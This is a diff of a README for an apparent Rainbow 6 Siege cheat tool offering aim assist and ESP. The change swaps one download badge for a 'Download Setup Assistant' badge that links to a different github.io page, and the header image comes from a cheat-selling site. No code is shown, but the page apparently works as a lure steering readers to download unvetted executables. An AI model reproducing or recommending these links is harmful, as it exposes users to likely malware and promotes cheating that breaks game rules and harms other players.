@@ -4,12 +4,7 @@
 
 <h1 align="center">🎯 Rainbow 6 Siege Aim Assist with ESP Tools</h1>
 
-<p align="center">
-  <a href="https://r6s-aim-assist-and-esp-tools.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20R6S%20Aim%20Assist%20with%20ESP%20Tools-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download R6S Aim Assist with ESP Tools" style="width:540px; height:37px;" />
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://mamiemichalek.github.io/.github/r6s-assist-and-tools)
 
 <p align="center">
   <img src="https://www.skycheats.com/uploads/monthly_2024_08/1(2).webp.eedd5f6e88593ca6402734c6c78ec4aa.webp" alt="R6S Aim Assist with ESP Tools Preview" width="800" />
